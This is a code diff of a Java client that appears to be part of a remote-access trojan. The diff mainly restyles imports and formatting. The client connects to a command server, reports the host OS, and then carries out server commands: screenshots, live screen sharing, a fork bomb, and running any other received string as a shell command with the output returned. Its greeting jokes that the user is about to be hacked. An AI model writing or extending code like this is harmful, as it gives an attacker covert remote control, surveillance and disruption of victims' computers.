@@ -1,18 +1,15 @@
-package main;
-
-import main.exception.ServerOfflineException;
-import main.network.Connection;
-import main.network.Message;
-import main.utils.OsCheck;
+package main.java;
 
 import java.io.IOException;
 import java.net.Socket;
 
-import static main.utils.Bomb.explode;
-import static main.utils.ClientUtils.runTerminalCommand;
-import static main.utils.ScreenUtils.sendScreenshot;
-import static main.utils.ScreenUtils.startScreenShare;
-import static main.utils.ScreenUtils.stopScreenShare;
+import main.java.exception.ServerOfflineException;
+import main.java.network.Connection;
+import main.java.network.Message;
+import main.java.utils.Bomb;
+import main.java.utils.ClientUtils;
+import main.java.utils.OsCheck;
+import main.java.utils.ScreenUtils;
 
 public class Client {
     static Connection connection;
@@ -22,10 +19,10 @@ public class Client {
     public static void main(String[] args) {
         try {
             System.out.println("Opa ta na hora de ser haskiado");
-            while (!isConnected)
+            while(!isConnected) {
                 beginConnection();
-
-        } catch (Exception e) {
+            }
+        } catch(Exception e) {
             e.printStackTrace();
         }
     }
@@ -34,8 +31,7 @@ public class Client {
         try {
             connection = new Connection(new Socket("localhost", 27015));
             isConnected = true;
-
-        } catch (IOException e) {
+        } catch(IOException e) {
             //TODO might cause a stackoverflow after many times that the server goes offline, to-analyze
             System.out.println("Server is offline");
             disconnected();
@@ -48,10 +44,10 @@ public class Client {
         connection.sendMessage(osMessage);
 
         try {
-            while (true) {
+            while(true) {
                 handleServerCommand();
             }
-        } catch (ServerOfflineException e) {
+        } catch(ServerOfflineException e) {
             beginConnection();
         }
     }
@@ -59,25 +55,25 @@ public class Client {
     private static void handleServerCommand() throws ServerOfflineException {
         String command = connection.readMessage().getCommand();
 
-        switch (command) {
+        switch(command) {
             case "screen":
-                sendScreenshot(connection, false);
+                ScreenUtils.sendScreenshot(connection, false);
                 break;
             case "start-screenshare":
-                startScreenShare(connection);
+                ScreenUtils.startScreenShare(connection);
                 break;
             case "stop-screenshare":
-                stopScreenShare();
+                ScreenUtils.stopScreenShare();
                 break;
             case "bomb":
                 try {
-                    explode();
-                } catch (IOException e) {
+                    Bomb.explode();
+                } catch(IOException e) {
                     connection.sendMessage(new Message("print", "ForkBomb failed: " + e.getMessage()));
                 }
                 break;
             default:
-                runTerminalCommand(MY_OS, command, connection);
+                ClientUtils.runTerminalCommand(MY_OS, command, connection);
         }
     }
 
